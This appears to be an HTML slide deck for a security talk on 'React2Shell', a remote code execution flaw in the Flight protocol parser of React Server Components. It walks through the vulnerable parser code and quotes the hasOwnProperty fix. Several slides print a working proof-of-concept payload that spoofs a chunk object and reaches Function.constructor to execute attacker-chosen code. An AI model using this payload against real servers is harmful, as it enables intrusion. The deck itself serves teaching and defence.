@@ -1,0 +1,903 @@
+<!doctype html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="color-scheme" content="dark">.
+    <title>Recovering Flight Data: React2Shell</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.0.4/reset.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.0.4/reveal.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.0.4/theme/black.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/monokai.min.css">
+
+    <style>
+        /* --- DEFCON THEME & UTILITIES --- */
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;700&family=VT323&display=swap');
+
+        :root {
+            --terminal-green: #00ff41;
+            --terminal-dim: #008F11;
+            --terminal-alert: #ff3333;
+            --terminal-blue: #33ccff;
+            --bg-color: #0d0d0d;
+        }
+
+        body { background-color: var(--bg-color); font-family: 'Fira Code', monospace; }
+        .reveal { color: var(--terminal-green); font-family: 'Fira Code', monospace; }
+        
+        /* Headers */
+        h1, h2, h3, h4 { 
+            font-family: 'VT323', monospace !important; 
+            text-transform: uppercase; 
+            text-shadow: 0 0 8px var(--terminal-green);
+        }
+
+        /* Code Blocks */
+        .reveal pre { 
+            background: #111; 
+            border: 1px solid var(--terminal-dim); 
+            box-shadow: 0 0 10px var(--terminal-dim); 
+            width: 100%;
+        }
+        .reveal code { font-family: 'Fira Code', monospace !important; }
+
+        .code-col {
+            font-size: 0.8em; /* Smaller code to fit side-by-side */
+            width: 100%;
+        }
+
+        .code-react {
+            font-size: 0.6em;
+        }
+
+        .codebase-link {
+            color: var(--terminal-blue);
+            text-decoration: none;
+            border-bottom: 1px dashed var(--terminal-blue);
+        }
+
+        /* Split Screen Grid for Walkthrough */
+        .split-screen {
+            display: grid;
+            grid-template-columns: 55% 45%; /* Slightly more space for code */
+            gap: 80px;
+            align-items: center;
+            height: 100%;
+            text-align: left;
+        }
+        .text-col h3 { margin-left: 0; color: var(--terminal-blue); }
+        .text-col p { font-size: 0.5em; line-height: 1.4; }
+        .text-col li { font-size: 0.5em; line-height: 1.4; }
+
+        /* CRT Scanline Overlay */
+        body::before {
+            content: " "; display: block; position: absolute; top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 2; background-size: 100% 2px, 3px 100%; pointer-events: none;
+        }
+
+        /* Utility Classes */
+        .highlight-red { color: var(--terminal-alert); font-weight: bold; }
+        .highlight-blue { color: var(--terminal-blue); font-weight: bold; }
+        .dim { color: #666; }
+        .border-box { border: 1px dashed var(--terminal-dim); padding: 10px; margin: 10px 0; }
+        .placeholder { background: #000; color: #555; height: 150px; display: flex; align-items: center; justify-content: center; border: 1px dotted #555; font-style: italic; }
+
+        /* Glitch Animation */
+        .glitch { position: relative; }
+        .glitch::before, .glitch::after {
+            content: attr(data-text); position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+        }
+        .glitch::before { left: 2px; text-shadow: -1px 0 red; clip: rect(24px, 550px, 90px, 0); animation: glitch-anim-2 3s infinite linear alternate-reverse; }
+        .glitch::after { left: -2px; text-shadow: -1px 0 blue; clip: rect(85px, 550px, 140px, 0); animation: glitch-anim 2.5s infinite linear alternate-reverse; }
+        @keyframes glitch-anim-2 {
+            0% { clip: rect(11px, 9999px, 81px, 0); }
+            100% { clip: rect(4px, 9999px, 96px, 0); }
+        }
+    </style>
+</head>
+<body>
+    <div class="reveal">
+        <div class="slides">
+
+            <section>
+                <h1 class="glitch" data-text="Recovering Flight Data">Recovering Flight Data</h1>
+                <h2 class="glitch" data-text="From the REact2Shell Crash">From the React2Shell Crash</h1>
+                <p class="dim">RPC + JavaScript, What could go wrong?</p>
+                <div style="margin-top: 50px; font-size: 0.6em; border-top: 1px solid var(--terminal-dim); display: inline-block; padding-top: 10px;">
+                    <p>PRESENTED BY: Saad El Jebbari</p>
+                    <p>DATE: 13th Feb 2026</p>
+                </div>
+
+                <aside class="notes">
+                  The goal of this talk is give you a big picture understanding, but also to dive into the technicalities as well. 
+                </aside>
+            </section>
+            <section>
+                <h2>$ whoami</h2>
+                <div style="text-align: left; margin-left: 20%; font-size: 0.6em;">
+                    <p>> <span class="highlight-blue">Handle:</span> @protozeit aka @saadhuh</p>
+                    <p>> <span class="highlight-blue">Role:</span> Senior Pentester @ Deloitte MCC</p>
+                    <p>> <span class="highlight-red">Focus:</span> Client-side web exploitation</p>
+                    <p>> <span class="highlight-red">Current Status:</span> Playing CTFs with L3ak (web)</p>
+                </div>
+            </section>
+
+            <section>
+                <h2>The Timeline</h2>
+                
+                <div style="font-size: 0.6em; text-align: left;">
+                    <div class="fragment fade-up border-box">
+                        <span class="highlight-blue">[DAY 0] Disclosure</span><br>
+                        React and Next.js coordinate disclosure of a 10 CVSS critical bomb. A seemingly impossible RCE in React Server Components.
+                    </div>
+                    <div class="fragment fade-up border-box">
+                        <span class="highlight-blue">[DAY 1] The Race</span><br>
+                        Twitter/X explodes. Security researchers race to replicate. 
+                        <div class="placeholder"><img src="media/chaos.png" alt=""></div>
+                    </div>
+                    <div class="fragment fade-up border-box">
+                        <span class="highlight-red">[DAY 2] The Noise</span><br>
+                        Fake PoCs flood GitHub. AI bots hallucinate exploits. Confusion reigns.
+                    </div>
+                </div>
+            </section>
+            <section>
+              <img src="media/vercel-ceo.png" height='600' alt="">              
+            </section>
+            <section>
+              <img src="media/maple-poc-tweet.png" height='600' alt="">              
+            </section>
+            <section>
+                <h2>How did we get here?</h2>
+                <p class="dim">A brief history of React's migration to the Server</p>
+                
+                
+
+                <div style="display: flex; justify-content: space-around; font-size: 0.7em; margin-top: 30px;">
+                    <div class="fragment">
+                        <h4 class="highlight-blue">Client Side (CSR)</h4>
+                        <p>Browser does everything.</p>
+                        <p>Huge JS bundles.</p>
+                        <p>Slow Load.</p>
+                    </div>
+                    <div class="fragment">
+                        <h4>&rarr;</h4>
+                    </div>
+                    <div class="fragment">
+                        <h4 class="highlight-blue">Server Side (SSR)</h4>
+                        <p>Server sends HTML.</p>
+                        <p>Browser "Hydrates".</p>
+                        <p>Duplicate Logic.</p>
+                    </div>
+                    <div class="fragment">
+                        <h4>&rarr;</h4>
+                    </div>
+                    <div class="fragment">
+                        <h4 class="highlight-red">React Server Components (RSC)</h4>
+                        <p>Components stay on Server.</p>
+                        <p>Direct DB access in UI code.</p>
+                        <p>DX optimal</p>
+                    </div>
+                </div>
+                <aside class="notes">
+                    Emphasize that RSC changes the trust boundary. It's no longer just an API; the component *is* the backend.
+                </aside>
+            </section>
+
+            <section>
+                <h2>The Flight Protocol</h2>
+                <p></p>
+                <div style="font-size: 0.8em; text-align: left; background: #111; padding: 20px; border: 1px solid var(--terminal-dim);">
+                    <p>When you use <span class="highlight-red">"use server"</span>, you are creating an API endpoint.</p>
+                    <p>Unlike REST or GraphQL, React uses <strong>Flight</strong>:</p>
+                    <ul>
+                        <li>Streaming (Row by row)</li>
+                        <li>Reference capabilities</li>
+                        <li>Bi-directional (Symmetry)</li>
+                    </ul>
+                </div>
+                <aside class="notes">
+                  This allows a developer to call code on the server as if it was a local function
+                  The endpoint is implicit and React takes care of all the messaging
+                  Needs to represent rich data types such as Promises over-the-wire
+                  This is not a trivial problem without introducing bugs
+                </aside>
+            </section>
+            <section>
+                <h2>Vocabulary</h2>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+                    <div class="fragment border-box">
+                        <h3 class="highlight-blue">Chunks</h3>
+                        <p>Lines of data separated by newlines.</p>
+                        <pre><code>1: "This is a chunk"
+2: "This is another"</code></pre>
+                    </div>
+                    <div class="fragment border-box">
+                        <h3 class="highlight-red">Reference ($)</h3>
+                        <p>A reference to data that hasn't arrived yet.</p>
+                        <pre><code>1: "$@0"</code></pre>
+                        <p class="dim">"Chunk 1 depends on Chunk 0"</p>
+                    </div>
+                </div>
+                <aside class="notes">
+                  These concepts are important to represent incomplete data.
+                </aside>
+            </section>
+            <section>
+                <h2>DOM in Flight</h2>
+                <p class="dim">Mapping Protocol to UI</p>
+                
+                <div style="font-size: 0.6em; text-align: left; margin-bottom: 20px;">
+                    <p class="highlight-blue">SERVER SENDS (The Stream):</p>
+                    <pre><code class="json">1:I["./app/page.js", ["chunks/1.js"], "Page"]
+2:{"type":"div", "children":"Hello Defcon"}</code></pre>
+                </div>
+                
+                <div style="font-size: 2em; text-align: center; color: white;">&darr;</div>
+
+                <div style="font-size: 0.6em; text-align: left;">
+                    <p class="highlight-blue">BROWSER RENDERS (The DOM):</p>
+                    <div style="background: white; color: black; padding: 10px; border-radius: 4px; font-family: sans-serif;">
+                        <div>Hello Defcon</div>
+                    </div>
+                </div>
+            </section>
+
+            <section>
+              <iframe width="1280" height="600" src="http://localhost:3002"></iframe>              
+            </section>
+            <section>
+                <h2>Flight Protocol Syntax</h2>
+                <p class="dim">The Dictionary of the Exploit</p>
+
+                
+
+                <div style="font-size: 0.6em; text-align: left; margin-top: 30px;">
+                    <ul style="list-style: none; padding-left: 0;">
+                        <li style="margin-bottom: 20px;">
+                            <span class="highlight-blue" style="font-weight: bold; font-size: 1.2em;">$</span> 
+                            &nbsp;&rarr; Denotes a reference to another chunk (resolved value).
+                        </li>
+                        <li style="margin-bottom: 20px;">
+                            <span class="highlight-red" style="font-weight: bold; font-size: 1.2em;">$@</span> 
+                            &nbsp;&rarr; Denotes a reference to a <span class="highlight-red">raw chunk object</span> (the Promise wrapper).
+                        </li>
+                        <li style="margin-bottom: 20px;">
+                            <span class="highlight-blue" style="font-weight: bold; font-size: 1.2em;">$B</span> 
+                            &nbsp;&rarr; Denotes a Blob reference (binary data).
+                        </li>
+                        <li style="margin-bottom: 20px;">
+                            <span class="highlight-red" style="font-weight: bold; font-size: 1.2em;">:</span> 
+                            &nbsp;&rarr; Used for property paths. <br>
+                            <span class="dim" style="margin-left: 30px;">(e.g., <code>$1:key</code> means "resolve chunk 1, then access property 'key'")</span>
+                        </li>
+                    </ul>
+                </div>
+            </section>
+
+            <section data-background-color="#220000">
+                <h1 class="glitch" data-text="THE CRASH">THE CRASH</h1>
+                <p>Analyzing the React2Shell Vulnerability</p>
+            </section>
+
+            <section data-auto-animate>
+                <div class="split-screen">
+                    <div class="code-col">
+                        <div>
+                            <pre><code class="http" style="font-size: 0.7em;">
+------WebKitFormBoundary...
+Content-Disposition: form-data; name="0"
+
+["$1:a:a"]
+------WebKitFormBoundary...
+Content-Disposition: form-data; name="1"
+
+{}
+------WebKitFormBoundary...
+                            </code></pre>
+                        </div>
+
+                        <div style="margin-top: 20px;">
+                            <pre><code class="javascript">
+"$1:a:a"      // Reference Chunk 1, props
+   |
+   v
+{}.a.a        // Chunk 1 is {}
+   |
+   v
+undefined.a   // {}.a is undefined
+                </code></pre>
+                        </div>
+                    </div>
+
+                    <div class="text-col fragment fade-up">
+                        <h3>The Vulnerability</h3>
+                        
+                        <div>
+                            <p>In vulnerable versions, the colon syntax <span class="highlight-blue">(:)</span> blindly walks the property chain.</p>
+                        </div>
+
+                        <div style="margin-top: 30px; border-top: 1px dashed var(--terminal-dim); padding-top: 20px;">
+                            <h4 style="font-size: 0.8em; color: var(--terminal-green);">The Fix</h4>
+                            <pre><code class="javascript" style="font-size: 0.6em;">
+const name = path[i];
+// explicitly check existence first!
+if (typeof value === 'object' && 
+    hasOwnProperty.call(value, name)) {
+  value = value[name];
+}
+                            </code></pre>
+                        </div>
+                    </div>
+                </div>
+                
+                <aside class="notes">
+                    Explain that before RCE, we found a crash.
+                    The parser was too trusting. It would try to access deep properties without checking if the parent existed.
+                    The patch introduced `hasOwnProperty`, which kills the crash but also hints at where the logic flaws were.
+                </aside>
+            </section>
+                <section data-auto-animate>
+                    <div class="split-screen">
+                        <div class="code-col">
+                            <pre><code class="javascript">
+{
+  0: {
+    then: "$1:then",
+    status: "resolved_model",
+    value: '{"then":"$B"}',
+    reason: 0,
+    _response: {
+      _formData: {
+        get: "$1:then:constructor"
+      },
+      _prefix: "console.log('☠️')//",
+    },
+  },
+  1: "$@0",
+}
+                            </code></pre>
+                        </div>
+                        <div class="text-col">
+                            <h3>The minimum viable exploit</h3>
+                            <p>The exploit triggers the resolution of a <span class="highlight-red">thenable chain.</span> inside the flight protocol parser with an <span class="highlight-red">attacker-controlled object.</span></p>
+                            <p>The final value after the thenables resolve is a Blob object that when parsed, executes user-controlled code.</p>
+                        </div>
+                    </div>
+                </section>
+
+            <section>
+
+
+                <section data-auto-animate>
+                    <div class="split-screen">
+                        <div class="code-col">
+                            <pre><code class="javascript" data-line-numbers="15">
+{
+  0: {
+    then: "$1:then",
+    status: "resolved_model",
+    value: '{"then":"$B"}',
+    reason: 0,
+    _response: {
+      _formData: {
+        get: "$1:then:constructor"
+      },
+      _prefix: "console.log('☠️')//",
+    },
+  },
+  1: "$@0",
+}
+                            </code></pre>
+                        </div>
+                        <div class="text-col">
+                            <h3>0. Entrypoint</h3>
+                            <p>The parser hits <span class="highlight-blue">1: "$@0"</span>.</p>
+                            <p>It sees <code>$@</code> and realizes this is a <strong>Promise reference</strong>.</p>
+                            <p>It pauses execution of Chunk 1 until it can resolve its dependency: <strong>Chunk 0</strong>.</p>
+                        </div>
+                    </div>
+                </section>
+
+          <section class="code-react">
+            <a class='codebase-link' href='https://github.com/facebook/react/blob/7aa5dda3b3e4c2baa905a59b922ae7ec14734b24/packages/react-server/src/ReactFlightReplyServer.js#L908'>packages/react-server/src/ReactFlightReplyServer.js</a>
+                    <pre><code class="typescript" data-line-numbers="14,15,16,17,18,19">function parseModelString(
+  response: Response,
+  obj: Object,
+  key: string,
+  value: string,
+  reference: void | string,
+): any {
+  if (value[0] === '$') {
+    switch (value[1]) {
+      case '$': {
+        // This was an escaped string value.
+        return value.slice(1);
+      }
+      case '@': {
+        // Promise
+        const id = parseInt(value.slice(2), 16);
+        const chunk = getChunk(response, id);
+        return chunk;
+      }
+      case 'F': {
+        // Server Reference
+        const ref = value.slice(2);
+        // TODO: Just encode this in the reference inline instead of as a model.
+        const metaData: {id: ServerReferenceId, bound: Thenable&lt;Array&lt;any&gt;&gt;} =
+          getOutlinedModel(response, ref, obj, key, createModel);
+        return loadServerReference(
+          response,
+          metaData.id,
+          metaData.bound,
+          initializingChunk,
+          obj,
+          key,
+        );
+      }
+      case 'T': {
+        // Temporary Reference
+        if (
+          reference === undefined ||
+          response._temporaryReferences === undefined
+        ) {
+          throw new Error(
+            'Could not reference an opaque temporary reference. ' +
+              'This is likely due to misconfiguring the temporaryReferences options ' +
+              'on the server.',
+          );
+        }
+        return createTemporaryReference(
+          response._temporaryReferences,
+          reference,
+        );
+      }
+      case 'Q': {
+        // Map
+        const ref = value.slice(2);
+        return getOutlinedModel(response, ref, obj, key, createMap);
+      }
+      case 'W': {
+        // Set
+        const ref = value.slice(2);
+        return getOutlinedModel(response, ref, obj, key, createSet);
+      }
+
+                    </code></pre>
+                </section>
+          <section class="code-react">
+            <a class='codebase-link' href='https://github.com/facebook/react/blob/7aa5dda3b3e4c2baa905a59b922ae7ec14734b24/packages/react-server/src/ReactFlightReplyServer.js#514'>packages/react-server/src/ReactFlightReplyServer.js</a>
+                    <pre><code class="typescript" data-line-numbers="14">function getChunk(response: Response, id: number): SomeChunk&lt;any&gt; {
+  const chunks = response._chunks;
+  let chunk = chunks.get(id);
+  if (!chunk) {
+    const prefix = response._prefix;
+    const key = prefix + id;
+    // Check if we have this field in the backing store already.
+    const backingEntry = response._formData.get(key);
+    if (backingEntry != null) {
+      // We assume that this is a string entry for now.
+      chunk = createResolvedModelChunk(response, (backingEntry: any), id);
+    } else {
+      // We're still waiting on this entry to stream in.
+      chunk = createPendingChunk(response);
+    }
+    chunks.set(id, chunk);
+  }
+  return chunk;
+}
+                    </code></pre>
+          <p>This is why Chunk is <span class='highlight-red'>thenable</span></p>
+          <p><span class='highlight-red'>chunk1.then()</span> will be called after React thinks the Promise was resolved</p>
+                </section>
+
+            </section>
+          
+            <section>
+            <section>
+                <div class="split-screen">
+                    <div class="code-col">
+                        <pre><code class="javascript" data-line-numbers="4-8">
+{
+  0: {
+    then: "$1:then",
+    status: "resolved_model",
+    value: '{"then":"$B"}',
+    reason: 0,
+    _response: {
+      _formData: {
+        get: "$1:then:constructor"
+      },
+      _prefix: "console.log('☠️')//",
+    },
+  },
+  1: "$@0",
+}
+                        </code></pre>
+                    </div>
+                    <div class="text-col">
+                        <h3>1. The Spoof</h3>
+                <p>Let's take a look at what's necessary to create a <span class='highlight-red'>fake Chunk object</span><p>
+                    </div>
+                </div>
+
+
+            </section>
+          <section class="code-react">
+            <a class='codebase-link' href='https://github.com/facebook/react/blob/7aa5dda3b3e4c2baa905a59b922ae7ec14734b24/packages/react-server/src/ReactFlightReplyServer.js#L121'>packages/react-server/src/ReactFlightReplyServer.js</a>
+                    <pre><code class="typescript" data-line-numbers="1-8">function Chunk(status: any, value: any, reason: any, response: Response) {
+  this.status = status;
+  this.value = value;
+  this.reason = reason;
+  this._response = response;
+}
+Chunk.prototype = (Object.create(Promise.prototype): any);
+Chunk.prototype.then = function &lt;T&gt;(
+  this: SomeChunk&lt;T&gt;,
+  resolve: (value: T) =&gt; mixed,
+  reject: (reason: mixed) =&gt; mixed,
+) {
+  const chunk: SomeChunk&lt;T&gt; = this;
+  switch (chunk.status) {
+    case RESOLVED_MODEL:
+      initializeModelChunk(chunk);
+      break;
+  }
+  switch (chunk.status) {
+    case INITIALIZED:
+      resolve(chunk.value);
+      break;
+    case PENDING:
+    case BLOCKED:
+    case CYCLIC:
+      if (resolve) {
+        if (chunk.value === null) {
+          chunk.value = ([]: Array&lt;(T) =&gt; mixed&gt;);
+        }
+        chunk.value.push(resolve);
+      }
+      if (reject) {
+        if (chunk.reason === null) {
+          chunk.reason = ([]: Array&lt;(mixed) =&gt; mixed&gt;);
+        }
+        chunk.reason.push(reject);
+      }
+      break;
+    default:
+      reject(chunk.reason);
+      break;
+  }
+};
+                    </code></pre>
+                </section>
+              </section>
+            <section>
+            <section>
+                <div class="split-screen">
+                    <div class="code-col">
+                        <pre><code class="javascript" data-line-numbers="4">
+{
+  0: {
+    then: "$1:then",
+    status: "resolved_model",
+    value: '{"then":"$B"}',
+    reason: 0,
+    _response: {
+      _formData: {
+        get: "$1:then:constructor"
+      },
+      _prefix: "console.log('☠️')//",
+    },
+  },
+  1: "$@0",
+}
+                        </code></pre>
+                    </div>
+                    <div class="text-col">
+                        <h3>1. The Spoof</h3>
+                        <p>React sees a <code>then</code> property.</p>
+                        <p>It attempts to resolve the reference: <code>$1:then</code>.</p>
+                        <ul>
+                            <li><strong>$1</strong> is pending Chunk.</li>
+                            <li><strong>:then</strong> accesses the property.</li>
+                        </ul>
+                        <p class="highlight-red">It grabs Chunk.prototype.then.</p>
+                    </div>
+                </div>
+
+
+            </section>
+          <section class="code-react">
+            <a class='codebase-link' href='https://github.com/facebook/react/blob/7aa5dda3b3e4c2baa905a59b922ae7ec14734b24/packages/react-server/src/ReactFlightReplyServer.js#L131'>packages/react-server/src/ReactFlightReplyServer.js</a>
+                    <pre><code class="typescript" data-line-numbers="7,8,9,10,11,12">function Chunk(status: any, value: any, reason: any, response: Response) {
+  this.status = status;
+  this.value = value;
+  this.reason = reason;
+  this._response = response;
+}
+Chunk.prototype = (Object.create(Promise.prototype): any);
+Chunk.prototype.then = function &lt;T&gt;(
+  this: SomeChunk&lt;T&gt;,
+  resolve: (value: T) =&gt; mixed,
+  reject: (reason: mixed) =&gt; mixed,
+) {
+  const chunk: SomeChunk&lt;T&gt; = this;
+  switch (chunk.status) {
+    case RESOLVED_MODEL:
+      initializeModelChunk(chunk);
+      break;
+  }
+  switch (chunk.status) {
+    case INITIALIZED:
+      resolve(chunk.value);
+      break;
+    case PENDING:
+    case BLOCKED:
+    case CYCLIC:
+      if (resolve) {
+        if (chunk.value === null) {
+          chunk.value = ([]: Array&lt;(T) =&gt; mixed&gt;);
+        }
+        chunk.value.push(resolve);
+      }
+      if (reject) {
+        if (chunk.reason === null) {
+          chunk.reason = ([]: Array&lt;(mixed) =&gt; mixed&gt;);
+        }
+        chunk.reason.push(reject);
+      }
+      break;
+    default:
+      reject(chunk.reason);
+      break;
+  }
+};
+                    </code></pre>
+                </section>
+              </section>
+
+            <section>
+            <section>
+                <div class="split-screen">
+                    <div class="code-col">
+                        <pre><code class="javascript" data-line-numbers="5">
+{
+  0: {
+    then: "$1:then",
+    status: "resolved_model",
+    value: '{"then":"$B"}',
+    reason: 0,
+    _response: {
+      _formData: {
+        get: "$1:then:constructor"
+      },
+      _prefix: "console.log('☠️')//",
+    },
+  },
+  1: "$@0",
+}
+                        </code></pre>
+                    </div>
+                    <div class="text-col">
+
+                        <h3>2. The Spoof pt.2</h3>
+                        <p>The parser loads <strong>Chunk 0</strong>.</p>
+                        <p>It reads <code>status: "resolved_model"</code>.</p>
+                        <p>Instead of creating a new object, it trusts that this JSON represents an <span class="highlight-blue">Internal React State</span> that is already finished.</p>
+                    </div>
+                </div>
+            </section>
+          <section class="code-react">
+            <a class='codebase-link' href='https://github.com/facebook/react/blob/7aa5dda3b3e4c2baa905a59b922ae7ec14734b24/packages/react-server/src/ReactFlightReplyServer.js#L131'>packages/react-server/src/ReactFlightReplyServer.js</a>
+                    <pre><code class="typescript" data-line-numbers="14-21">function Chunk(status: any, value: any, reason: any, response: Response) {
+  this.status = status;
+  this.value = value;
+  this.reason = reason;
+  this._response = response;
+}
+Chunk.prototype = (Object.create(Promise.prototype): any);
+Chunk.prototype.then = function &lt;T&gt;(
+  this: SomeChunk&lt;T&gt;,
+  resolve: (value: T) =&gt; mixed,
+  reject: (reason: mixed) =&gt; mixed,
+) {
+  const chunk: SomeChunk&lt;T&gt; = this;
+  switch (chunk.status) {
+    case RESOLVED_MODEL:
+      initializeModelChunk(chunk);
+      break;
+  }
+  switch (chunk.status) {
+    case INITIALIZED:
+      resolve(chunk.value);
+      break;
+    case PENDING:
+    case BLOCKED:
+    case CYCLIC:
+      if (resolve) {
+        if (chunk.value === null) {
+          chunk.value = ([]: Array&lt;(T) =&gt; mixed&gt;);
+        }
+        chunk.value.push(resolve);
+      }
+      if (reject) {
+        if (chunk.reason === null) {
+          chunk.reason = ([]: Array&lt;(mixed) =&gt; mixed&gt;);
+        }
+        chunk.reason.push(reject);
+      }
+      break;
+    default:
+      reject(chunk.reason);
+      break;
+  }
+};
+                    </code></pre>
+                </section>
+
+        </section>
+        <section>
+            <section>
+                <div class="split-screen">
+                    <div class="code-col">
+                        <pre><code class="javascript" data-line-numbers="6">
+{
+  0: {
+    then: "$1:then",
+    status: "resolved_model",
+    value: '{"then":"$B"}',
+    reason: 0,
+    _response: {
+      _formData: {
+        get: "$1:then:constructor"
+      },
+      _prefix: "console.log('☠️')//",
+    },
+  },
+  1: "$@0",
+}
+                        </code></pre>
+                    </div>
+                    <div class="text-col">
+                        <h3>3. The Blob Gadget</h3>
+                        <p>The parser sees <code>$B</code> (Blob).</p>
+                        <p>It switches logic paths to "Blob Handling Mode".</p>
+                        <p>It assumes the object has a valid <code>_formData</code> property that it can call <code>.get()</code> on.</p>
+                    </div>
+                </div>
+            </section>
+          <section class="code-react">
+            <a class='codebase-link' href='https://github.com/facebook/react/blob/7aa5dda3b3e4c2baa905a59b922ae7ec14734b24/packages/react-server/src/ReactFlightReplyServer.js#L1057'>packages/react-server/src/ReactFlightReplyServer.js</a>
+                    <pre><code class="typescript" data-line-numbers="7-12">        case 'm':
+          return parseTypedArray(response, value, BigUint64Array, 8, obj, key);
+        case 'V':
+          return parseTypedArray(response, value, DataView, 1, obj, key);
+        case 'B': {
+          // Blob
+          const id = parseInt(value.slice(2), 16);
+          const prefix = response._prefix;
+          const blobKey = prefix + id;
+          // We should have this backingEntry in the store already because we emitted
+          // it before referencing it. It should be a Blob.
+          const backingEntry: Blob = (response._formData.get(blobKey): any);
+          return backingEntry;
+        }
+      }
+    }
+                    </code></pre>
+                </section>
+            </section>
+
+        </section>
+            <section>
+                <div class="split-screen">
+                    <div class="code-col">
+                        <pre><code class="javascript" data-line-numbers="9-14">
+
+{
+  0: {
+    then: "$1:then",
+    status: "resolved_model",
+    value: '{"then":"$B"}',
+    reason: 0,
+    _response: {
+      _formData: {
+        get: "$1:then:constructor"
+      },
+      _prefix: "console.log('☠️')//",
+    },
+  },
+  1: "$@0",
+}
+
+                        </code></pre>
+                    </div>
+                    <div class="text-col">
+                        <h3>4. Argument Control</h3>
+                        <p>React tries to call:</p>
+                        <p><code>_formData.get(prefix + key)</code></p>
+                        <p>But we replaced <code>get</code> with:</p>
+                        <p class="highlight-red">Function.constructor</p>
+                        <p>This executes <code>new Function(prefix + key)</code>.</p>
+                        <p class="highlight-red">pwned.</p>
+                    </div>
+                </div>
+            </section>
+
+                <section data-auto-animate>
+                    <div class="split-screen">
+                        <div class="code-col">
+                            <pre><code class="javascript">
+{
+  0: {
+    then: "$1:then",
+    status: "resolved_model",
+    value: '{"then":"$B"}',
+    reason: 0,
+    _response: {
+      _formData: {
+        get: "$1:then:constructor"
+      },
+      _prefix: "console.log('☠️')//",
+    },
+  },
+  1: "$@0",
+}
+                            </code></pre>
+                        </div>
+                        <div class="text-col">
+                            <h3>The minimum viable exploit</h3>
+                            <p>The exploit triggers the resolution of a <span class="highlight-red">thenable chain.</span> inside the flight protocol parser with an <span class="highlight-red">attacker-controlled object.</span></p>
+                            <p>The final value after the thenables resolve is a Blob object that when parsed, executes user-controlled code.</p>
+                        </div>
+                    </div>
+                </section>
+            <section>
+              <h2>Is this a prototype pollution exploit?</h2>
+            </section>
+
+            <section>
+            <section>
+              <img src="media/rpc-regret.png" height='480' alt="">
+            </section>
+            <section>
+              <iframe width="1280" height="480" src="https://www.youtube.com/embed/uXCipjbcQfM?t=1642" title="Rich Harris on frameworks, the web, and the edge" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture;" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+            </section>
+            </section>
+        <!--
+
+            <section>
+                <h2>The Patch</h2>
+                <div class="border-box">
+                    <code>hasOwnProperty()</code>
+                </div>
+                <p>The parser now checks if a property belongs to the object instance before accessing it.</p>
+                <p class="dim">No more walking the prototype chain.</p>
+            </section>
+
+-->
+            <section data-background-color="#000">
+                <h1>EOF</h1>
+                <p>Recovered Successfully.</p>
+            </section>
+
+        </div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.0.4/reveal.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.0.4/plugin/highlight/highlight.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/reveal.js/5.0.4/plugin/notes/notes.min.js"></script>
+    
+    <script>
+        Reveal.initialize({
+            hash: true,
+            transition: 'slide',
+            backgroundTransition: 'slide',
+            // Added RevealNotes to plugins list
+            plugins: [ RevealHighlight, RevealNotes ]
+        });
+    </script>
+</body>
+</html>
